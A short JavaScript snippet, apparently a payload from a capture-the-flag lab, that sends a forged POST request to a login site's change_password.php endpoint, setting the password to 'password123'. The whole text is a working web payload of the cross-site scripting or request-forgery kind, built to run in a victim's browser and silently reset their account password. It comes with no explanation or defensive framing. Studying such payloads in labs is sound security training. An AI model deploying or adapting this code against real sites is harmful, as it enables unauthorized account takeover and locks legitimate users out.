var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://login.worldwap.thm/change_password.php', true);
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('new_password=password123');
